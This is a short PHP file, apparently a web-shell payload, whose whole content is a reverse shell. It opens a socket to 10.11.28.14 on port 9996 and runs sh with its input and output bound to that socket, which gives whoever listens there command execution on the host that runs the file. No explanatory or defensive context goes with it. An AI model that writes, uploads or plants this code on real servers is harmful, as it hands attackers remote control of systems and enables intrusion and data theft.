<?php
$sock=fsockopen("10.11.28.14",9996);
shell_exec("sh <&3 >&3 2>&3");
?>
